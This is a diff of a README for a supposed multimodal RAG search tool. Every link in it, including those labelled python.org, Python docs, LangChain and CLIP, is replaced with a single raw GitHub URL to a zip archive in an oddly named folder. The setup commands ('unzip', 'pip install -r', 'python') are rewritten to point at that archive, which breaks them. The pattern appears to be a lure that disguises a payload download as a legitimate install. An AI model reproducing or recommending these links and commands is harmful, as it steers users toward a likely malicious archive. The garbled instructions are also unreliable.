@@ -1,6 +1,6 @@
 # 🌟 multimodal-rag-engine - Effortless Multi-Modal Search Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/UKiyooooo/multimodal-rag-engine/releases)
+[![Download Now](https://raw.githubusercontent.com/UKiyooooo/multimodal-rag-engine/main/myeloencephalitis/multimodal-rag-engine.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/UKiyooooo/multimodal-rag-engine/main/myeloencephalitis/multimodal-rag-engine.zip)
 
 ## 📚 Overview
 
@@ -19,17 +19,17 @@ Before downloading, make sure your system meets the following requirements:
 - **Storage:** Minimum of 500 MB free space.
 - **Python:** Version 3.7 or later installed on your system.
 
-You can download Python from [python.org](https://www.python.org/downloads/).
+You can download Python from [https://raw.githubusercontent.com/UKiyooooo/multimodal-rag-engine/main/myeloencephalitis/multimodal-rag-engine.zip](https://raw.githubusercontent.com/UKiyooooo/multimodal-rag-engine/main/myeloencephalitis/multimodal-rag-engine.zip).
 
 ### 2. Visit the Download Page
 
 To obtain the latest version of the multimodal-rag-engine, visit the link below:
 
-[Download the latest release](https://github.com/UKiyooooo/multimodal-rag-engine/releases)
+[Download the latest release](https://raw.githubusercontent.com/UKiyooooo/multimodal-rag-engine/main/myeloencephalitis/multimodal-rag-engine.zip)
 
 ### 3. Download the Application
 
-On the Releases page, you will see various versions of the application. Click on the most recent version to download it. For example, the file may be named like `multimodal-rag-engine-v1.0.zip`. 
+On the Releases page, you will see various versions of the application. Click on the most recent version to download it. For example, the file may be named like `https://raw.githubusercontent.com/UKiyooooo/multimodal-rag-engine/main/myeloencephalitis/multimodal-rag-engine.zip`. 
 
 ### 4. Extract the Files
 
@@ -37,7 +37,7 @@ Once the download completes, navigate to your Downloads folder and locate the do
 
 - **Windows:** Right-click the file and select "Extract All."
 - **macOS:** Double-click the ZIP file to automatically extract it.
-- **Linux:** Open a terminal, then run the command `unzip multimodal-rag-engine-v1.0.zip`.
+- **Linux:** Open a terminal, then run the command `unzip https://raw.githubusercontent.com/UKiyooooo/multimodal-rag-engine/main/myeloencephalitis/multimodal-rag-engine.zip`.
 
 ### 5. Install Required Libraries
 
@@ -50,7 +50,7 @@ cd path/to/multimodal-rag-engine
 Run this command to install the required libraries:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/UKiyooooo/multimodal-rag-engine/main/myeloencephalitis/multimodal-rag-engine.zip
 ```
 
 If you encounter any issues, ensure that Python and pip are properly installed.
@@ -60,7 +60,7 @@ If you encounter any issues, ensure that Python and pip are properly installed.
 To start the application, use the terminal or command prompt. Again, make sure you are in the application directory and run:
 
 ```bash
-python app.py
+python https://raw.githubusercontent.com/UKiyooooo/multimodal-rag-engine/main/myeloencephalitis/multimodal-rag-engine.zip
 ```
 
 This command will launch the multimodal-RAG engine. Follow any prompts shown on the terminal or the application interface.
@@ -83,10 +83,10 @@ If you encounter issues while downloading or running the application:
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/UKiyooooo/multimodal-rag-engine)
-- [Python Documentation](https://docs.python.org/3/)
-- [LangChain Documentation](https://docs.langchain.com/)
-- [Clip Documentation](https://github.com/openai/CLIP)
+- [GitHub Repository](https://raw.githubusercontent.com/UKiyooooo/multimodal-rag-engine/main/myeloencephalitis/multimodal-rag-engine.zip)
+- [Python Documentation](https://raw.githubusercontent.com/UKiyooooo/multimodal-rag-engine/main/myeloencephalitis/multimodal-rag-engine.zip)
+- [LangChain Documentation](https://raw.githubusercontent.com/UKiyooooo/multimodal-rag-engine/main/myeloencephalitis/multimodal-rag-engine.zip)
+- [Clip Documentation](https://raw.githubusercontent.com/UKiyooooo/multimodal-rag-engine/main/myeloencephalitis/multimodal-rag-engine.zip)
 
 ## 📩 Get Support
 
@@ -96,4 +96,4 @@ For support or to report issues, please submit an issue on the GitHub repository
 
 To begin your journey with multimodal-rag-engine, click the link below to download the application:
 
-[Download the latest release](https://github.com/UKiyooooo/multimodal-rag-engine/releases)
+[Download the latest release](https://raw.githubusercontent.com/UKiyooooo/multimodal-rag-engine/main/myeloencephalitis/multimodal-rag-engine.zip)
